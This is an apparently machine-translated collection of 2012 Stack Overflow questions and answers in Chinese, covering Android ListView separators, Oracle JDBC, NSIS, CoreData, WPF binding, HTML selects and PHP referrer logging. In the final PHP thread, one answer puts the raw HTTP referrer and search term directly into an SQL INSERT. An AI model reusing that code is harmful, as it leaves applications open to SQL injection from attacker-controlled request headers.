import android.widget.TextView;
import co.uk.listapp.myapp.util.NotifyingAsyncQueryHandler;
import co.uk.listapp.myapp.util.NotifyingAsyncQueryHandler.NotifyingAsyncQueryListener;

/**
 * Shows a smart way of handling separators in {@link ListView}s. It also shows
 * some ways to boost your {@link ListView}s using techniques like 'section
 * caching', ViewHolder, CharArrayBuffer, etc.
 * 

 */
public class ChooseTeamActivity extends ListActivity implements NotifyingAsyncQueryListener {

    private AudioFilesAdapter mAdapter;
    private NotifyingAsyncQueryHandler mQueryHandler;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        mAdapter = new AudioFilesAdapter(this, null);
        setListAdapter(mAdapter);

        // Starts querying the media provider. This is done asynchronously not
        // to possibly block the UI or even worse fire an ANR...
        mQueryHandler = new NotifyingAsyncQueryHandler(getContentResolver(), this);
        mQueryHandler.startQuery(Media.EXTERNAL_CONTENT_URI, AudioFilesQuery.PROJECTION, AudioFilesQuery.SORT_ORDER);
    }

    @Override
    protected void onDestroy() {
        // Clear any strong reference to this Activity
        mQueryHandler.clearQueryListener();
        super.onDestroy();
    }

    public void onQueryComplete(int token, Object cookie, Cursor cursor) {
        if (cursor != null) {
            startManagingCursor(cursor);
        }
        mAdapter.changeCursor(cursor);
    }

    private static class AudioFilesViewHolder {
        public TextView separator;
        public TextView titleView;
        public CharArrayBuffer titleBuffer = new CharArrayBuffer(128);
    }

    private static class AudioFilesAdapter extends CursorAdapter {

        /**
         * State of ListView item that has never been determined.
         */
        private static final int STATE_UNKNOWN = 0;

        /**
         * State of a ListView item that is sectioned. A sectioned item must
         * display the separator.
         */
        private static final int STATE_SECTIONED_CELL = 1;

        /**
         * State of a ListView item that is not sectioned and therefore does not
         * display the separator.
         */
        private static final int STATE_REGULAR_CELL = 2;

        private final CharArrayBuffer mBuffer = new CharArrayBuffer(128);
        private int[] mCellStates;

        public AudioFilesAdapter(Context context, Cursor cursor) {
            super(context, cursor);
            mCellStates = cursor == null ? null : new int[cursor.getCount()];
        }

        @Override
        public void changeCursor(Cursor cursor) {
            super.changeCursor(cursor);
            mCellStates = cursor == null ? null : new int[cursor.getCount()];
        }

        @Override
        public void bindView(View view, Context context, Cursor cursor) {

            final AudioFilesViewHolder holder = (AudioFilesViewHolder) view.getTag();

            /*
             * Separator
             */
            boolean needSeparator = false;

            final int position = cursor.getPosition();
            cursor.copyStringToBuffer(AudioFilesQuery.TITLE, holder.titleBuffer);

            switch (mCellStates[position]) {
                case STATE_SECTIONED_CELL:
                    needSeparator = true;
                    break;

                case STATE_REGULAR_CELL:
                    needSeparator = false;
                    break;

                case STATE_UNKNOWN:
                default:
                    // A separator is needed if it's the first itemview of the
                    // ListView or if the group of the current cell is different
                    // from the previous itemview.
                    if (position == 0) {
                        needSeparator = true;
                    } else {
                        cursor.moveToPosition(position - 1);

                        cursor.copyStringToBuffer(AudioFilesQuery.TITLE, mBuffer);
                        if (mBuffer.sizeCopied > 0 && holder.titleBuffer.sizeCopied > 0 && mBuffer.data[0] != holder.titleBuffer.data[0]) {
                            needSeparator = true;
                        }

                        cursor.moveToPosition(position);
                    }

                    // Cache the result
                    mCellStates[position] = needSeparator ? STATE_SECTIONED_CELL : STATE_REGULAR_CELL;
                    break;
            }

            if (needSeparator) {
                holder.separator.setText(holder.titleBuffer.data, 0, 1);
                holder.separator.setVisibility(View.VISIBLE);
            } else {
                holder.separator.setVisibility(View.GONE);
            }

            /*
             * Title
             */
            holder.titleView.setText(holder.titleBuffer.data, 0, holder.titleBuffer.sizeCopied);

        }

        @Override
        public View newView(Context context, Cursor cursor, ViewGroup parent) {

            View v = LayoutInflater.from(context).inflate(R.layout.single_item, parent, false);

            // The following code allows us to keep a reference on the child
            // views of the item. It prevents us from calling findViewById at
            // each getView/bindView and boosts the rendering code.
            AudioFilesViewHolder holder = new AudioFilesViewHolder();
            holder.separator = (TextView) v.findViewById(R.id.separator);
            holder.titleView = (TextView) v.findViewById(R.id.title);

            v.setTag(holder);

            return v;
        }

    }

     // Keep query data in one place

    private interface AudioFilesQuery {
        String[] PROJECTION = {
                Media._ID, Media.TITLE, Media.ALBUM, Media.ARTIST
        };

        int TITLE = 1;
        //int ALBUM = 2;
        //int ARTIST = 3;

        String SORT_ORDER = Media.TITLE + " ASC";
    }

} 
```

NotfyingAsyncQueryHandler

```
import java.lang.ref.WeakReference;

import android.content.AsyncQueryHandler;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;

/**
 * A particular {@link AsyncQueryHandler} allowing clients to be notified via a
 * listener. The {@link NotifyingAsyncQueryHandler} also make sure no strong
 * reference is kept on the given listener (as it is often a Context).
 * 

 */
public class NotifyingAsyncQueryHandler extends AsyncQueryHandler {

    private WeakReference<NotifyingAsyncQueryListener> mListener;

    /**
     * Client may use this to listen to completed query operations.

     */
    public interface NotifyingAsyncQueryListener {
        void onQueryComplete(int token, Object cookie, Cursor cursor);
    }

    public NotifyingAsyncQueryHandler(ContentResolver resolver, NotifyingAsyncQueryListener listener) {
        super(resolver);
        setQueryListener(listener);
    }

    /**
     * Assign the given {@link NotifyingAsyncQueryListener}.
     */
    public void setQueryListener(NotifyingAsyncQueryListener listener) {
        mListener = (listener != null) ? new WeakReference<NotifyingAsyncQueryListener>(listener) : null;
    }

    public void clearQueryListener() {
        mListener = null;
    }

    public void startQuery(Uri uri, String[] projection) {
        startQuery(-1, null, uri, projection, null, null, null);
    }

    public void startQuery(Uri uri, String[] projection, String sortOrder) {
        startQuery(-1, null, uri, projection, null, null, sortOrder);
    }

    @Override
    protected void onQueryComplete(int token, Object cookie, Cursor cursor) {
        final NotifyingAsyncQueryListener listener = (mListener == null) ? null : mListener.get();
        if (listener != null) {
            listener.onQueryComplete(token, cookie, cursor);
        } else if (cursor != null) {
            cursor.close();
        }
    }
} 
```

single_item.xml

```
<?xml version="1.0" encoding="utf-8"?>

<LinearLayout
    xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"
    android:paddingBottom="8dp"
    android:background="@android:color/white">

    <TextView
        style="?android:attr/listSeparatorTextViewStyle"
        android:id="@+id/separator"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:textColor="@android:color/white" />

    <TextView
        android:id="@+id/title"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:singleLine="true"
        android:textColor="@color/blue"
        android:textSize="16sp"
        android:textStyle="bold"
        android:paddingTop="8dp"
        android:paddingRight="8dp"
        android:paddingLeft="8dp" />

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:04:20.153

参考这个 github 站点。你可以得到你想要的。
[https://github.com/cyrilmottier/ListViewTipsAndTricks/tree/425e1ddc0e3d1a94f45ae1a21414c485481610c6](https://github.com/cyrilmottier/ListViewTipsAndTricks/tree/425e1ddc0e3d1a94f45ae1a21414c485481610c6)

# java - spring/hibernate 应用程序中的 C3P0 配置？

> ID：10446657
> 
> 赞同：0
> 
> 时间：2012-05-04T09:59:42.257
> 
> 标签：java, spring, hibernate

我正在使用 Spring/Hibernate。我配置了 c3p0 连接池。在从池中获取连接之后/之前，它应该验证连接以验证数据库是否启动。为此，在 spring 配置文件中配置以下属性是否足够？

```
testConnectionOnCheckout to true without using preferredTestQuery 
```

我已经配置的其他属性如下：

```
 <prop key="hibernate.c3p0.min_size">5</prop>
            <prop key="hibernate.c3p0.max_size">20</prop>
            <prop key="hibernate.c3p0.timeout">300</prop>
            <prop key="hibernate.c3p0.max_statements">50</prop>
            <prop key="hibernate.c3p0.idle_test_period">3000</prop>
            <prop key="hibernate.jdbc.batch_size">50</prop> 
```

谢谢！

# java - 如何将 IN 参数指定为 TABLE 类型的 Oracle 数据类型？

> ID：10446658
> 
> 赞同：5
> 
> 时间：2012-05-04T09:59:50.520
> 
> 标签：java, oracle, oracle10g

基于上一个关于stackoverflow的问题：

[使用 JDBC 从存储过程中获取 Oracle 表类型](https://stackoverflow.com/questions/6410452/fetch-oracle-table-type-from-stored-procedure-using-jdbc)

答案为我们提供了一个使用 Oracle getArray 和 java.sql.Datum 的 OUT 参数示例。但是，如果我想指定具有 Oracle TABLE 类型数据类型的 IN 参数怎么办？

```
CREATE OR REPLACE TYPE XXINV.XX_PROD_SRCH_RSLT_REC_TYPE IS OBJECT(

item_no                   VARCHAR2(30),  
inventory_item_id         NUMBER,  
organization_id           NUMBER,  
item_description          VARCHAR2(240),  
item_long_description     VARCHAR2(240), 
cat_description           VARCHAR2(240),  
category_set_name         VARCHAR2(240),  
nla_flag                  VARCHAR2(1),  
CONSTRUCTOR  FUNCTION XX_PROD_SRCH_RSLT_REC_TYPE RETURN SELF AS RESULT , 
MEMBER PROCEDURE log_prod_srch_rslt_rec_values (SELF  IN  XX_PROD_SRCH_RSLT_REC_TYPE) )

CREATE OR REPLACE TYPE xxinv.XX_PROD_SRCH_RSLT_TAB_TYPE AS TABLE OF XX_PROD_SRCH_RSLT_REC_TYPE; 
```

我的SP是这样的：

```
XX_PART_RESEARCH_PKG .GET_PARTS
   (p_called_from          IN     VARCHAR2,
    p_item_id              IN     NUMBER,
    p_category_id          IN     NUMBER,
    p_mnfg_part_id         IN     NUMBER,
    p_item_desc            IN     VARCHAR2,
    p_include_NLA_items    IN     VARCHAR2,
    p_catl_group_id        IN     NUMBER,
    p_catl_attributes      IN     XX_PROD_ATTR_TAB_TYPE,
    x_srch_rslt            IN    XX_PROD_SRCH_RSLT_TAB_TYPE,
    x_return_status        OUT    VARCHAR2,
    x_returb_msg           OUT    VARCHAR2
   ) 
```

其中 XX_PROD_ATTR_TAB_TYPE 是作为 IN 参数的表。

如何在 Java 中指定这个？我正在使用 Oracle 10g 第 2 版。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T14:13:07.930

由于您的类型定义了一个构造函数，我不确定这是否会完全正常工作，但我已经在我的博客上发布了有关如何执行此操作的示例。首先，如何将记录类型从 Java 传递到 Oracle：

[http://betteratoracle.com/posts/31-passing-record-types-between-oracle-and-java](http://betteratoracle.com/posts/31-passing-record-types-between-oracle-and-java)

然后将其扩展为将记录数组从 Java 传递到 Oracle：

[http://betteratoracle.com/posts/32-passing-arrays-of-record-types-between-oracle-and-java](http://betteratoracle.com/posts/32-passing-arrays-of-record-types-between-oracle-and-java)

# c - FAT：列出目录中的所有文件

> ID：10446661
> 
> 赞同：2
> 
> 时间：2012-05-04T10:00:12.690
> 
> 标签：c, api, fat

我正在使用[Chan 的 FAT 库](http://elm-chan.org/fsw/ff/00index_e.html)，它似乎提供了标准的 FAT 文件系统 API。API 似乎没有直接提供列出给定目录中的所有文件。

列出可以访问标准 FAT API 的目录中所有文件的标准方法是什么？是否有我可以访问的特殊文件（一些“目录表”？）`f_read()`？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-04T10:03:48.027

看看[f_opendir](http://elm-chan.org/fsw/ff/en/opendir.html)和[f_readdir](http://elm-chan.org/fsw/ff/en/readdir.html)：

> f_readdir 函数按顺序读取目录条目。重复调用 f_readdir 函数可以读取目录中的所有项目。当已读取所有目录条目且没有要读取的项目时，该函数将一个空字符串返回到 f_name[] 成员中，而不会出现任何错误。当给 FileInfo 一个空指针时，目录对象的读取索引将被倒带。

# javascript - Json 对象反射

> ID：10446666
> 
> 赞同：0
> 
> 时间：2012-05-04T10:00:35.457
> 
> 标签：javascript, jquery, json

我试图弄清楚如何通过提供属性名称从 jsonObject 获取属性值

好吧，假设我有对象

```
var jsonObj = eval('{"key1":"value1","key2":"value2"}'); 
```

我想通过使用一种方法来获得一个值

```
function getPropertyValue(key){
 return jsonObj.key;
}

alert(getPropertyValue("key1")); 
```

我知道我可以通过使用*jsonObj.Key*来获得价值，但我想通过使用方法来做到这一点

是否可以？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-04T10:02:57.493

一方面：使用正确的方法解析 JSON 并避免使用`eval`：

```
var jsonObj = JSON.parse( '[{"key1":"value1","key2":"value2"}]' ); 
```

您的方法可能如下所示：

```
function getPropertyValue(key){
 return jsonObj[ key ];
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:02:25.247

您可以访问像数组这样的对象：

```
return jsonObj[key]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:03:36.373

如果 jsonObj.key 有效，您可以这样参数化密钥：

```
 function getPropertyValue(key)
 {  
    return jsonObj[key];
 } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-04T10:04:32.970

试试这个：

```
function getPropertyValue(key){
 return jsonObj[key];
}

alert(getPropertyValue("key1")); //will alert value1 
```

# asp.net-mvc - Asp.net MVC 4 API 和 Knockout.js：生成 Knockout.js 模型

> ID：10446667
> 
> 赞同：8
> 
> 时间：2012-05-04T10:00:35.930
> 
> 标签：asp.net-mvc, knockout.js

我想从我的 AspNet API 控制器和模型类生成我的 knockout.js 类。

我用谷歌搜索了很多，但看起来我必须自己构建它。

感谢任何指向现有工具/代码的指针，这将使这更容易！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-05-04T14:06:04.353

看看使用[Knockout.mapping](http://knockoutjs.com/documentation/plugins-mapping.html)。这会将从您的控制器接收到的 json 自动转换为带有 observables 的视图模型。

# nsis - 当安装程序以静默模式调用卸载程序时，如何在 NSIS 安装期间显示进度？

> ID：10446669
> 
> 赞同：1
> 
> 时间：2012-05-04T10:00:42.670
> 
> 标签：nsis

我有一个**NSIS 安装程序**，它通过这个命令卸载旧版本

`ExecWait "$INSTDIR\temp\uninstall.exe /S _?=$INSTDIR"`

安装程序应该等到旧版本的卸载完成，然后继续进行新安装。问题是，用户在安装窗口中很长一段时间都看不到任何进度（卸载程序必须删除一些巨大的目录，所以它需要自己的甜蜜时间）。

我们不想删除该`/S`开关，因为它会弹出卸载程序窗口，用户必须单击几下才能继续卸载并最终关闭卸载程序。

无论如何，在静默模式下执行卸载程序时，我可以在安装程序窗口中显示一些进度吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T16:05:31.603

使用 /S 时无法获得反馈。您可以做的是制作自己的参数并调整卸载程序：

```
!include FileFunc.nsh

UninstPage uninstConfirm un.skipifsilentprogress
UninstPage instFiles

Function un.skipifsilentprogress
ClearErrors
${GetParameters} $0
${GetOptions} "$0" "/UIS" $1
${IfNot} ${Errors}
    SetAutoClose true ;Make sure user does not have to click close
    Abort
${EndIf}
FunctionEnd

Section uninstall
Detailprint uninstalling...
Sleep 555
Sleep 555
Sleep 555
SectionEnd 
```

并使用特殊的 /UIS 开关运行它...

# core-data - 如何通过在 CoreData 中使用 predicateWithFormat 来检查对象是否在对象的 NSSet 内？

> ID：10446673
> 
> 赞同：4
> 
> 时间：2012-05-04T10:00:54.777
> 
> 标签：core-data, nsset, predicatewithformat

在我的 iPhone 应用程序中，我尝试使用 TableViewController 来显示共享相同标签的照片列表（下面代码中的 currentTag）。照片和标签是数据库中的“多对多”关系。每张照片都有一个名为“tags”的属性，其类型为 NSSet。每个标签都有一个名为“photos”的属性，它的类型也是 NSSet。标签有一个名为“名称”的属性。 ![关系](../Images/786b77336d32f98bfb28c18d6e7edf0b.png)

我正在尝试执行以下代码：

```
 NSFetchRequest *request = [NSFetchRequest fetchRequestWithEntityName:@"Photo"];
 request.predicate = [NSPredicate predicateWithFormat:@"tags contains %@",currentTag]; 
```

问题是由于引号的原因，我不能在 predicateWithFormat 内做很多事情。并且关键字“包含”在这里不起作用，它们仅用于字符串。我也试过

```
 [NSPredicate predicateWithFormat:@"%@ IN tags",currentTag] 
```

也没有运气...

[另外，我在这里](https://stackoverflow.com/questions/7235790/coredata-nspredicate-with-nsset)发现有人有类似的问题，然后我尝试以下代码，表格视图控制器中仍然没有任何显示。但是，如果我评论该行，所有照片都会显示。

```
 [NSPredicate predicateWithFormat:@"self in %@",[currentTag photos]] 
```

有人可以帮忙吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-05-04T21:10:16.883

使用任何：

```
[NSPredicate predicateWithFormat:@"ANY tags == %@",currentTag]; 
```

# c++ - 显示多个壳对象的属性表

> ID：10446675
> 
> 赞同：3
> 
> 时间：2012-05-04T10:01:03.123
> 
> 标签：c++, winapi, windows-shell, shellexecute

我必须显示指定项目的属性窗口：文件夹和文件。

对于一项显示属性窗口非常简单——只需设置 .lpFile 字段。但我不知道如何显示几个项目的属性窗口。

1) 枚举 .lpFile 中的文件，如 ""file1.txt" "file2.txt"" 等不起作用。即使它有效，它也不适用，因为文件列表可能太大。

2) 通过 PIDLIST_ABSOLUTE 工作没有带来任何结果。可以通过 ILCreateFromPath 为单个文件创建 PIDLIST_ABSOLUTE，但不能将多个 PIDLIST_ABSOLUTE 合并为一个。

有没有人有任何解决方法？任何答案将不胜感激

PS：正如我最近所了解的，PIDLIST_ABSOLUTE 是为具体的唯一对象创建的。所以两个或多个 PIDLIST_ABSOLUTE 不能连接。但问题仍然是实际的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-30T08:26:58.097

> 调用 IShellFolder::GetUIObjectOf，传递多个 pidls，并请求 IContextMenu，然后调用“属性”动词。 – Raymond Chen

谢谢你，雷蒙德。有用！

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-10T16:15:31.640

delphi中最简单的方法：

从 IExplorerBrowser 或剪贴板获取 DataObject

```
 if (OleGetClipboard(LDataObject) = S_OK) then
    SHMultiFileProperties(LDataObject, 0); 
```

否则使用动词“属性”：

```
function TExplorerFrame.DoVerb(Verb: AnsiString): Boolean;
var
  LFolderView: IFolderView2;
begin
  Result := False;
  if Supports(FCurrentShellView, IID_IFOLDERVIEW2, LFolderView) then
  begin
    if Verb = 'default' then
      Result := (LFolderView.InvokeVerbOnSelection(nil) = S_OK)
    else
      Result := (LFolderView.InvokeVerbOnSelection(pAnsiChar(@Verb[1])) = S_OK);
  end;
end; 
```

# iphone - 用于 UI 测试的 Xcode 自动化工具

> ID：10446677
> 
> 赞同：1
> 
> 时间：2012-05-04T10:01:12.127
> 
> 标签：iphone, xcode, ui-automation, ios-ui-automation, ui-testing

我正在编写一个 javascript UI 自动化测试脚本。它如何截取正在运行的测试的屏幕截图？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-04T22:29:04.393

在您的 JS 代码中，您可以使用 UIATarget 方法 captureScreenWithName 和 captureRectWithName 截取屏幕截图：

[captureScreenWithName](http://developer.apple.com/library/ios/#documentation/ToolsLanguages/Reference/UIATargetClassReference/UIATargetClass/UIATargetClass.html#//apple_ref/javascript/instm/UIATarget/captureScreenWithName)

[captureRectWithName](http://developer.apple.com/library/ios/#documentation/ToolsLanguages/Reference/UIATargetClassReference/UIATargetClass/UIATargetClass.html#//apple_ref/javascript/instm/UIATarget/captureRectWithName)

例如：

```
target = UIATarget.localTarget();
application = target.frontMostApp();
target.captureScreenWithName("myscreenshot"); 
```

然后，如果你点击 Instruments 中的 Record 按钮来重放你的脚本，当运行完成并停止时，你应该在你的测试结果目录中找到你的截图。

在我的系统上，运行上述示例后保存的屏幕截图位于此处：

```
~/Instruments/myscreenshot.png 
```

# c# - 绑定到 SelectedItem 中的 ObservableCollection

> ID：10446685
> 
> 赞同：0
> 
> 时间：2012-05-04T10:01:28.223
> 
> 标签：c#, silverlight, data-binding, mvvm

我正在使用 Silverlight 进行开发，现在我想将我的 ComboBox 绑定到 ObservableCollection。但是，ObservableCollection 在我的 SelectedItem 内，所以我不确定它是否能够按预期工作。

我试过`ItemsSource={Binding SelectedItem.SourceList}`and `ItemsSource={Binding Path=SelectedItem.SourceList}`，但两种方式都没有给出我想要的输出。

如果有人有任何想法......**非常感谢**！

**编辑：**对象内的 ObservableCollection 是 BerthList。此 BerthList 中的项目受用户先前选择的端口的限制。如果我将 ObservableCollection of Berths 放在 ViewModel 中，就会出现问题。

假设港口 A 有泊位 A 和 B；港口 B 有泊位 C 和 D。如果我为我的第一个项目选择一个港口 A/泊位 A 组合**（让我们将此项目称为时间表）**，那么当我转到下一个项目并选择港口 B 时，bam，我的泊位选择我的第一个项目消失了，因为泊位列表不再有端口 A。

我想知道这是否有助于解释事情......

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:15:16.140

您的模型听起来有点奇怪，不确定为什么您选择的项目会包含实际来源 - 如果您提供有关您的域的更多信息，也许会有所帮助。即你的课是什么？

无论如何，您的绑定问题很可能是`Source`. 如果您没有显式提供源，则绑定使用 DataContext 作为源（[我写的关于数据绑定的教程](http://www.scottlogic.co.uk/blog/colin/2012/04/everything-you-wanted-to-know-about-databinding-in-wpf-silverlight-and-wp7-part-two/)可能会帮助您理解这个概念）。无论如何，要修复它，请将源设置为 ComboBox ...

```
<ComboBox x:Name="myCombo"
          ItemsSource={Binding SelectedItem.SourceList, ElementName=myCombo}"> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:18:57.510

要在您的组合框中有一个 SelectedItem，您首先需要有 ItemSource。看来您解决问题的方法不正确。

尝试找到 ObservableCollection 与您的 SelectedItem 无关的方法。

# c# - 资源部分中的 WPF DataContextProxy

> ID：10446689
> 
> 赞同：5
> 
> 时间：2012-05-04T10:01:40.300
> 
> 标签：c#, wpf, silverlight, mvvm, datacontext

我在 WPF 应用程序中使用 DataContextProxy 时遇到问题。当我将 DataContextProxy 放在 Grid 的 Resources 部分时，它永远不会加载。如果我将 DataContextProxy 移出资源部分，一切正常。

我已经对此进行了一段时间的调查，并尝试了多种方法来调试应用程序。

*   我在尝试使用代理的控件上放置了一个 DebugConverter。调试转换器永远不会被调用。

*   我使用 WPFSnoop 来查看是否有任何绑定错误。我在 DataContextProxy 上收到以下绑定错误，

    System.Windows.Data 错误：3：找不到提供 DataContext 的元素。BindingExpression：（无路径）；数据项=空；目标元素是'代理'（名称=''）；目标属性是“DataContext”（类型“对象”）

*   我在 DataContextProxy 的加载事件上放置了一个断点。永远不会调用加载的事件，并且我在从未调用过的 DataContextChanged 事件中放置了一个断点。

这是一些示例代码来演示这一点。显然我知道我并不真的需要在 TextBox 上使用 DataContextProxy。

```
<Window x:Class="WpfDataContextProxyBug.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:local="clr-namespace:WpfDataContextProxyBug"
        Title="MainWindow" Height="350" Width="525">
    <Window.Resources>
        <local:DebugConverter x:Key="DebugConverter"/>
    </Window.Resources>
    <Grid>
        <Grid.Resources>
            <local:Proxy x:Key="Proxy" DataContext="{Binding}" />
        </Grid.Resources>

    <TextBox DataContext="{Binding Path=Name, Source={StaticResource Proxy}, Converter={StaticResource DebugConverter}}"/>
    </Grid>
</Window> 
```

DataContextProxy 类

```
public class Proxy : FrameworkElement
{
    public Proxy()
    {
        Loaded += DataContextProxy_Loaded;
        DataContextChanged += Proxy_DataContextChanged;
    }

    void Proxy_DataContextChanged(object sender, DependencyPropertyChangedEventArgs e)
    {

    }

    void DataContextProxy_Loaded(object sender, RoutedEventArgs e)
    {

    }

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-19T18:40:47.140

当我尝试在 WPF 中使用 DataContextProxy 时，我也遇到了这个问题。我想出了一个受它启发的解决方案，它似乎可以很好地处理这项工作。一探究竟：

```
public class DataContextProxyBehavior : Behavior<FrameworkElement>
{
    public Object DataSource
    {
        get { return (Object)GetValue(DataSourceProperty); }
        set { SetValue(DataSourceProperty, value); }
    }
    public static readonly DependencyProperty DataSourceProperty =
        DependencyProperty.Register("DataSource", typeof(Object), typeof(DataContextProxy), null);

    protected override void OnAttached()
    {
        base.OnAttached();

        // Binds the target datacontext to the proxy,
        // so whenever it changes the proxy will be updated
        var binding = new Binding();
        binding.Source = this.AssociatedObject;
        binding.Path = new PropertyPath("DataContext");
        binding.Mode = BindingMode.OneWay;
        BindingOperations.SetBinding(this, DataContextProxyBehavior.DataSourceProperty, binding);

        // Add the proxy to the resource collection of the target
        // so it will be available to nested controls
        this.AssociatedObject.Resources.Add(
            "DataContextProxy",
            this
        );
    }
    protected override void OnDetaching()
    {
        base.OnDetaching();

        // Removes the proxy from the Resources
        this.AssociatedObject.Resources.Remove(
            "DataContextProxy"
        );
    }
} 
```

您只需要将其附加到父元素。子元素中的静态资源引用将保持不变。我在[这里](https://stackoverflow.com/questions/13456199/getting-datacontext-of-datagrid-to-use-it-in-contex-menu/13458112#13458112)发布了一个使用示例。

# html - 如何为下拉菜单中的单词着色？

> ID：10446690
> 
> 赞同：3
> 
> 时间：2012-05-04T10:01:46.030
> 
> 标签：html, css, xhtml

我不想为整个文本着色，而是想为下拉列表中的每个单词着色..这似乎不起作用？

```
<select> 
    <option> Entry <span style="color:red">One</span> </option>
    <option> Entry <span style="color:red">Two</span> </option>
    <option> Entry <span style="color:red">Three</span> </option>
</select> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-04T10:04:16.950

`<select>`这对于原生元素是不可能的。

您只能通过在标签上设置 CSS`color`属性来为整个选项着色。`<option>`

在下拉框中使用“丰富”内容的常见解决方法是将其替换为基于 JS 的内容（即下拉框只是一个包含元素列表的 div）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:35:32.237

是的，你不能`<select>`像@ThiefMaster 所说的那样选择元素。但是您始终可以创建一个无序列表来创建下拉列表（甚至是 div）。我通常使用`<ul>`s 制作并使用 jQuery 或 CSS 过渡制作动画。

我创建了一个示例下拉列表。代码如下或访问 JS Fiddle。[点击这里](http://jsfiddle.net/subash1232/GsxKk/1/)。

或以下是代码。

**HTML**

```
<ul>  
<li><a href="#">About</a> 
  <ul> 
    <li><a href="#">History</a></li> 
    <li><a href="#">Team</a></li> 
    <li><a href="#">Offices</a></li> 
  </ul> 
</li> 
```

​</p>

**CSS**

```
ul li{width: 100px;}

ul li a{
    background: red;
    padding: 5px;
    display: block;
    border-bottom: 1px solid black;
}

ul li ul li:first-child a{
    color: white;
}

ul li ul li{
   height: 0;
}

ul li:hover ul li{height: 100%;} 
```

​</p>

# c# - 识别相同表单的实例

> ID：10446696
> 
> 赞同：0
> 
> 时间：2012-05-04T10:02:14.600
> 
> 标签：c#, winforms

我们如何识别相同表单的实例

这是我的问题：我只想显示一次相同表单的每个实例：

```
for (int l = 0; l < 2; l++)
        {
            cameraInstance[l].Start();
            if (cameraInstance[l].MoveDetection == true)
            {
                Formes.CameraViewVS f1 = new Formes.CameraViewVS(cameraInstance[l], adresseIPArray[l]);

                foreach (Form S in Application.OpenForms)
                {
                    if ((S.GetType() == typeof(Formes.CameraViewVS)) && (cameraInstance[l].adresse == f1.IP))  
                    {
                        S.Show();
                        cameraInstance[l].MoveDetection = false;
                        return;
                    }
                }

                                   f1.Owner = this;
                f1.Show();

            }             
        }
Any idea 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-05T20:11:02.777

像这样，问题中没有足够的细节来给出确切的答案：

```
 foreach (Form S in Application.OpenForms)
            {
                var frm = S as Formes.CameraViewVS;
                if (frm != null && frm.Addresse == cameraInstance[l].adresse) {
                    // Match, activate it
                    cameraInstance[l].MoveDetection = false;
                    frm.WindowState = FormWindowState.Normal;
                    frm.Activate();
                    return;
                }
            }
            // No match found, create a new one
            var f1 = new Formes.CameraViewVS(cameraInstance[l], adresseIPArray[l]);
            f1.Show(this); 
```

假设 CamerViewVS 具有公共地址属性。

# php - 捕获和存储Referrer

> ID：10446699
> 
> 赞同：0
> 
> 时间：2012-05-04T10:02:26.997
> 
> 标签：php, insert, http-referer

我先道歉，这真的很简单，但给我带来了很多烦恼。我只用了一周左右的时间在 PHP 上工作，并且真的是随时根据需要学习。以下是我当前的问题。我正在尝试获取 Google 推荐关键字。管理现在无法理解为什么它不会将值插入到 dbase 表中。

```
// capture referral url
$referringPage = parse_url( $_SERVER['HTTP_REFERER'] );
if ( stristr( $referringPage['host'], 'google.' ) )
{
  parse_str( $referringPage['query'], $queryVars );
  echo $queryVars['q']; // This is the search term used
}

// general form data insert
$sql="INSERT INTO refer_kws (kwid, keyword)
VALUES('','what value should I have here')";

if (!mysql_query($sql,$con))
  {
  die('Error: ' . mysql_error());
  }
echo "";

mysql_close($con)

?> 
```

我已经尝试了几个选项，他们只是继续输入 Array 作为值？？但是当我使用 "?echo $_GET['q'] ?" 在页面上它工作正常并显示值？

我知道这很简单。我真的这样做，但就是无法得到它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-04T10:08:10.473

你不应该把数组放在''之间，这会使它成为一个字符串。因为数组的字符串值为“Array”，所以它将“Array”存储在数据库中。`VALUES('',$referringPage)`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-04T10:15:08.973

您应该为每种类型的网站单独进行查询，因为 Google 将使用“q”`GET`变量中的关键字将客户发送给您，并修改表以添加引荐来源主机：

```
 $referringPage = parse_url( $_SERVER['HTTP_REFERER'] );
 if ( stristr( $referringPage['host'], 'google.' ) ){
   parse_str( $referringPage['query'], $queryVars );
   // echo $queryVars['q']; // This is the search term used  --- no need to print this
   $sql="INSERT INTO refer_kws (`kwid`, `host`, `keyword`) VALUES('',  $referringPage['host'], $queryVars['q'])";

 } else {
    $sql="INSERT INTO refer_kws (`kwid`, `host`, `keyword`) VALUES('', $referringPage['host'], '')"; // other type of referrers -  you can insert the full REFERRER here!
 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-04T10:16:34.647

只需检查以下代码可能会对您有所帮助，即放置哪个值。

```
var_dump($referringPage);
if ( stristr( $referringPage['host'], 'google.' ) )
{
  parse_str( $referringPage['query'], $queryVars );
  var_dump($queryVars);
  echo $queryVars['q']; // This is the search term used
